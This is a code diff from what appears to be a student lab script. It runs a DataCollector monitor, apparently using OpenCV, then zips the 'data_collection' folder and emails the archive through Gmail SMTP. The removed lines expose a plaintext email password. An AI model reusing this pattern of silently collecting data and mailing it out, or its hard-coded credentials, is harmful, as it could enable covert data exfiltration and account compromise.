@@ -13,7 +13,7 @@ import cv2
 import traceback
 import json
 from logger import DataCollectorLogger
-from email_sender import MailZipClient
+from email_sender import send_gmail_with_attachment, create_zip_zipfile
 
 
 FOLDER_NAME = 'data_collection'
@@ -659,26 +659,23 @@ def main():
         collector = DataCollector()
         collector.start_monitoring()
 
-        # Отправка данных по email (при необходимости)
-        email_client = MailZipClient(
-            smtp_server="smtp.gmail.com",
-            smtp_port=587,
-            username="mokaiv118@gmail.com",
-            password="mail_for_lab4",
-            default_from="mokaiv118@gmail.com"
+        sender_email = "mokaiv118@gmail.com"
+        sender_password = "xxxx xxxx xxxx xxxx"  # пароль приложения
+        recipient_email = "mokaiv118@gmail.com"
+        subject = "5 секунд"
+        message = "Привет! Это письмо содержит архив 5ти секунд."
+        create_zip_zipfile("data_collection", "data_collection.zip")
+
+        file_path = "data_collection.zip"  
+        
+        send_gmail_with_attachment(
+            sender_email=sender_email,
+            sender_password=sender_password,
+            recipient_email=recipient_email,
+            subject=subject,
+            message=message,
+            attachment_path=file_path
         )
-        # try:
-        #     zip_path = os.path.join(os.getcwd(), "data_collection.zip")
-        #     email_client.zip_folder(FOLDER_PATH, zip_path)
-        #     email_client.send_email_with_attachment(
-        #         to_addrs=["mokaiv118@gmail.com"],
-        #         subject="Data Collection Report",
-        #         body="Please find the attached data collection files.",
-        #         attachment_paths=[zip_path]
-        #     )
-        #     collector.logger.log_info("Данные успешно отправлены по email.")
-        # except Exception as e:
-        #     collector.logger.log_error(f"Ошибка при отправке email: {str(e)}")
 
 
     except KeyboardInterrupt:
